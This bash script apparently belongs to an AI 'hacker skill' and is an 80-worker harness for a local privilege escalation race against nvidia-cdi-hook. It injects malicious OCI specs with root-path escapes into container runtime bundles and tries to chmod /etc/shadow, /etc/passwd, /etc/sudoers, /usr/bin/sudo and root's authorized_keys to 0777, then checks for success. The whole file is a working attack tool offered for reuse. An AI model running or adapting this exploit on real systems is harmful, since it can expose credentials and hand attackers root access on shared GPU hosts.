#!/bin/bash
# nvidia-cdi-lpe-harness.sh
# Reusable 80-worker volume harness for real TOCTOU LPE research against nvidia-cdi-hook.
# Part of the permanent "hacker" skill.
#
# Philosophy:
# - Real docker --gpus --runtime nvidia only
# - AI-mutated malicious OCI specs (root path escapes)
# - Tight race on runtime-written bundle
# - Pre/post verification with stat
# - Live visible output + jsonl artifacts
#
# Usage:
#   ./nvidia-cdi-lpe-harness.sh
#   tail -f /tmp/hacker_nvidia_fuzz.log | grep --line-buffered -E 'W[0-9]|RACED|POSSIBLE'

set -u

LOG=/tmp/hacker_nvidia_fuzz.log
HITS=/tmp/hacker_nvidia_hits.jsonl
HARNESS_DIR=/tmp/hacker_harness

echo "=== HACKER SKILL - NVIDIA CDI LPE HARNESS START $(date) ===" | tee $LOG
> $HITS
mkdir -p "$HARNESS_DIR"

# AI-generated / book-inspired malicious OCI variants
# Grounded in Art of Exploitation (TOCTOU + path resolution abuse) + Maleh-style mutation feedback
VARIANTS=(
'{"ociVersion":"1.0.0","root":{"path":"/"},"process":{"user":{"uid":0,"gid":0}}}'
'{"ociVersion":"1.0.0","root":{"path":"/proc/1/root"},"process":{"user":{"uid":0}}}'
'{"ociVersion":"1.0.0","root":{"path":"."},"process":{"user":{"uid":0}}}'
'{"ociVersion":"1.0.0","root":{"path":"../../.."},"process":{"user":{"uid":0,"gid":0}}}'
'{"ociVersion":"1.0.0","root":{"path":"/proc/1/root/.."},"process":{"user":{"uid":0}}}'
'{"ociVersion":"1.0.0","root":{"path":"/"},"mounts":[{"destination":"/hostetc","source":"/etc","options":["rbind","rw"]}]}'
'{"ociVersion":"1.0.0","root":{"path":"/"},"annotations":{"nvidia.cdi":"hook-test"}}'
'{"ociVersion":"1.0.0","root":{"path":"/tmp/evil"},"process":{"user":{"uid":0}}}'
)

TARGETS="/etc/shadow /etc/passwd /root/.ssh/authorized_keys /etc/sudoers /usr/bin/sudo"

worker() {
  local wid=$1
  local rounds=50
  for r in $(seq 1 $rounds); do
    echo "[W$wid R$r] round start" | tee -a $LOG

    local b="$HARNESS_DIR/w${wid}r${r}"
    mkdir -p "$b"

    local vidx=$(( (wid + r) % ${#VARIANTS[@]} ))
    local SPEC="${VARIANTS[$vidx]}"

    echo "$SPEC" > "$b/config.json"
    cp "$b/config.json" "$b/state.json"

    local rootpath
    rootpath=$(python3 -c '
import json,sys
try:
  print(json.loads(sys.argv[1]).get("root",{}).get("path","?"))
except:
  print("?")
' "$SPEC" 2>/dev/null)

    echo "[W$wid R$r] variant root=$rootpath" | tee -a $LOG

    local tgt
    tgt=$(echo "$TARGETS" | tr ' ' '\n' | shuf -n1)

    # Direct call (cd to make config.json resolvable)
    (cd "$b" && strace -f -e trace=fchmodat /usr/bin/nvidia-cdi-hook --debug chmod --path "$tgt" --mode 0777 --container-spec config.json 2>&1 | \
      grep -E 'fchmodat|Ignoring|failed|No paths|Skipping|error' | head -3 | sed "s/^/[W$wid R$r] /" | tee -a $LOG) || true

    # Real privileged trigger + race
    local cname="hkr${wid}r${r}"
    echo "[W$wid R$r] docker create --gpus --runtime nvidia" | tee -a $LOG
    local cid
    cid=$(docker create --gpus all --name "$cname" --runtime nvidia python:3.11-slim sleep 1.2 2>/dev/null || true)

    if [ -n "$cid" ]; then
      # Record baseline
      for t in $TARGETS; do
        stat -c "%n %a %U" "$t" 2>/dev/null | sed "s/^/[W$wid R$r PRE] /" >> "$LOG"
      done

      sleep 0.007   # tight window - tune per machine

      local raced=0
      for d in $(find /run /var/run -type d 2>/dev/null | grep -E "$cid" | head -5); do
        if [ -f "$d/state.json" ] || [ -f "$d/config.json" ]; then
          echo "$SPEC" > "$d/state.json" 2>/dev/null || true
          cp "$d/state.json" "$d/config.json" 2>/dev/null || true
          echo "[W$wid R$r] RACED real bundle $d -> root=$rootpath" | tee -a $LOG
          raced=1
        fi
      done

      if [ $raced -eq 0 ]; then
        for d in $(find /tmp -maxdepth 4 -type d -name "*${cname}*" 2>/dev/null | head -2); do
          echo "$SPEC" > "$d/state.json" 2>/dev/null || true
          cp "$d/state.json" "$d/config.json" 2>/dev/null || true
          echo "[W$wid R$r] RACED fallback $d" | tee -a $LOG
        done
      fi

      docker start "$cname" >/dev/null 2>&1 || true
      sleep 0.035

      # Verify real effect
      for t in $TARGETS; do
        m=$(stat -c %a "$t" 2>/dev/null || echo "na")
        if [ "$m" = "777" ] || [ "$m" = "7777" ] || [ "$m" = "4755" ]; then
          echo "[W$wid R$r] *** POSSIBLE LPE HIT $t mode=$m ***" | tee -a $LOG
          echo "{\"type\":\"lpe_hit\",\"wid\":$wid,\"round\":$r,\"file\":\"$t\",\"mode\":\"$m\",\"time\":\"$(date -Iseconds)\"}" >> "$HITS"
        fi
      done

      docker rm -f "$cname" >/dev/null 2>&1 || true
    fi

    # Side pressure
    python3 -c '
import socket,os
for _ in range(2):
  try:
    s=socket.socket(socket.AF_UNIX,socket.SOCK_STREAM); s.settimeout(0.04)
    s.connect("/run/nvidia-persistenced/socket"); s.send(os.urandom(16)); s.close()
  except: pass
for dev in ["/dev/nvidia0","/dev/nvidiactl","/dev/nvidia-uvm"]:
  try: os.close(os.open(dev, os.O_RDWR|os.O_NONBLOCK))
  except: pass
' 2>/dev/null || true

    echo "{\"type\":\"round\",\"wid\":$wid,\"r\":$r,\"root\":\"$rootpath\"}" >> "$HITS"
    rm -rf "$b"
  done
  echo "[W$wid] DONE $rounds rounds" | tee -a $LOG
}

echo "Launching 80 workers..." | tee -a $LOG
for w in $(seq 0 79); do
  worker $w >> "/tmp/hacker_w${w}.log" 2>&1 &
done

# Keep GPU/runtime warm
for i in 1 2; do
  docker run -d --rm --gpus all --name hacker_vload$i python:3.11-slim python -c "
import time
print('V100 load', $i)
time.sleep(200)
" 2>/dev/null || true
done

# Extra trigger volume
echo "Firing extra docker --gpus waves..." | tee -a $LOG
for i in $(seq 1 30); do
  docker run --rm --gpus all python:3.11-slim echo "wave$i" >/dev/null 2>&1 &
done

wait

echo "=== HACKER SKILL HARNESS COMPLETE $(date) ===" | tee -a $LOG
nvidia-smi --query-gpu=utilization.gpu,memory.used --format=csv,noheader 2>/dev/null | tee -a $LOG
uptime | tee -a $LOG
echo "Hits: $(wc -l < $HITS) lines in $HITS"
echo "Main log: $LOG"
echo "Per-worker logs: /tmp/hacker_w*.log"
